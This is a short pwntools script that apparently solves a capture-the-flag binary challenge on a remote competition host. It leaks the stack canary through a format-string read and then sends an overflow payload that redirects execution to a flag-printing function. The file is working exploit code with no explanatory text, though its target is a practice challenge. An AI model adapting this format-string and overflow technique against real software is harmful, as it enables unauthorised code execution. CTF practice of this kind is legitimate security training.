#!/usr/bin/env python3

from pwn import *

# p = process("./bad_with_names")
p = remote("challenges.ists.io", 1353)

# gdb.attach(p, gdbscript="b *0x00000000004012e2\nb *0x000000000040133c\ndefine hook-stop\ntelescope $rsp -l 32\necho\n")

flag_addr = 0x401216
len_to_of = 0x78

p.recvuntil("So what was your name again?:")

payload = "%19$lx"
p.sendline(payload)
p.recvline()

canary = int(p.recvline().strip().ljust(8,b'\x00'),16)
log.info(f"Found canary: {hex(canary)}")

padding = b'\x00'*(len_to_of-len(payload)-len(p64(canary))-10+8)
padding2 = b'\x00'*8

payload = padding + p64(canary) + p64(flag_addr) + p64(flag_addr)

p.sendline(payload)


p.interactive()
